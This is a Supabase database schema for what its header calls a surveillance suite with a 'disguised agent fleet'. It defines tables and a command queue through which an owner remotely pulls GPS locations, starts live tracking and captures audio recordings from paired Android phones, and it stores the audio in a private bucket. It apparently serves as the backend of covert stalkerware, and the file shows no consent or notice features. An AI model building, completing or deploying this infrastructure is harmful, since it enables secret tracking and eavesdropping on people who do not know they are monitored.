-- ============================================================================
-- SM Telemetry & Surveillance Suite - Supabase Database Schema
-- Architecture: Owner Console & Disguised Agent Fleet
-- ============================================================================

-- Extensions setup
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- 1. OWNERS TABLE
-- Maps 1:1 with Supabase auth.users
CREATE TABLE IF NOT EXISTS public.owners (
    id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
    email TEXT NOT NULL UNIQUE,
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

-- Trigger to auto-create public.owners on auth.users signup
CREATE OR REPLACE FUNCTION public.handle_new_owner()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO public.owners (id, email)
    VALUES (new.id, new.email)
    ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
    AFTER INSERT OR UPDATE ON auth.users
    FOR EACH ROW EXECUTE FUNCTION public.handle_new_owner();

-- 2. DEVICES TABLE
-- Represents registered agent devices
CREATE TABLE IF NOT EXISTS public.devices (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    owner_id UUID NOT NULL REFERENCES public.owners(id) ON DELETE CASCADE,
    pairing_code VARCHAR(12) NOT NULL,
    name TEXT NOT NULL,
    model TEXT DEFAULT 'Unknown Device',
    android_version TEXT DEFAULT '16',
    battery_level INTEGER DEFAULT 100 CHECK (battery_level >= 0 AND battery_level <= 100),
    is_charging BOOLEAN DEFAULT FALSE,
    fcm_token TEXT,
    status TEXT NOT NULL DEFAULT 'pending_pair' CHECK (status IN ('pending_pair', 'online', 'offline', 'busy')),
    last_seen_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

CREATE INDEX IF NOT EXISTS idx_devices_owner_id ON public.devices(owner_id);
CREATE INDEX IF NOT EXISTS idx_devices_pairing_code ON public.devices(pairing_code);
CREATE INDEX IF NOT EXISTS idx_devices_status ON public.devices(status);

-- 3. COMMANDS TABLE
-- Queue for instructions sent from Owner to Agent
CREATE TABLE IF NOT EXISTS public.commands (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    owner_id UUID NOT NULL REFERENCES public.owners(id) ON DELETE CASCADE,
    type TEXT NOT NULL CHECK (type IN ('get_location', 'start_recording', 'stop_recording', 'live_track')),
    payload JSONB NOT NULL DEFAULT '{}'::jsonb,
    status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'delivered', 'executing', 'completed', 'failed')),
    error_message TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

CREATE INDEX IF NOT EXISTS idx_commands_device_status ON public.commands(device_id, status);
CREATE INDEX IF NOT EXISTS idx_commands_owner ON public.commands(owner_id);
CREATE INDEX IF NOT EXISTS idx_commands_created_at ON public.commands(created_at DESC);

-- 4. LOCATIONS TABLE
-- Telemetry fixes captured by agent
CREATE TABLE IF NOT EXISTS public.locations (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    command_id UUID REFERENCES public.commands(id) ON DELETE SET NULL,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    accuracy REAL NOT NULL DEFAULT 0.0,
    altitude DOUBLE PRECISION DEFAULT 0.0,
    speed REAL DEFAULT 0.0,
    bearing REAL DEFAULT 0.0,
    battery_level INTEGER DEFAULT 100,
    is_charging BOOLEAN DEFAULT FALSE,
    provider TEXT DEFAULT 'fused',
    captured_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

CREATE INDEX IF NOT EXISTS idx_locations_device_captured ON public.locations(device_id, captured_at DESC);
CREATE INDEX IF NOT EXISTS idx_locations_command_id ON public.locations(command_id);

-- 5. RECORDINGS TABLE
-- Metadata for AAC audio chunks stored in Supabase Storage
CREATE TABLE IF NOT EXISTS public.recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    command_id UUID REFERENCES public.commands(id) ON DELETE SET NULL,
    storage_path TEXT NOT NULL UNIQUE,
    duration_seconds INTEGER NOT NULL DEFAULT 60,
    file_size_bytes BIGINT NOT NULL DEFAULT 0,
    format TEXT NOT NULL DEFAULT 'audio/mp4a-latm',
    chunk_index INTEGER NOT NULL DEFAULT 0,
    recorded_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now()),
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

CREATE INDEX IF NOT EXISTS idx_recordings_device_recorded ON public.recordings(device_id, recorded_at DESC);
CREATE INDEX IF NOT EXISTS idx_recordings_command ON public.recordings(command_id);

-- 6. STORAGE BUCKET CONFIGURATION
-- Private bucket for all audio chunks
INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
VALUES (
    'recordings',
    'recordings',
    false,
    52428800, -- 50 MB limit per individual chunk
    ARRAY['audio/mp4a-latm', 'audio/aac', 'audio/m4a', 'audio/mp4']
)
ON CONFLICT (id) DO UPDATE SET
    public = false,
    file_size_limit = 52428800,
    allowed_mime_types = ARRAY['audio/mp4a-latm', 'audio/aac', 'audio/m4a', 'audio/mp4'];

-- 7. REALTIME REPLICATION ENABLEMENT
-- Ensure commands, devices, and telemetry broadcast updates
ALTER PUBLICATION supabase_realtime ADD TABLE public.devices;
ALTER PUBLICATION supabase_realtime ADD TABLE public.commands;
ALTER PUBLICATION supabase_realtime ADD TABLE public.locations;
ALTER PUBLICATION supabase_realtime ADD TABLE public.recordings;
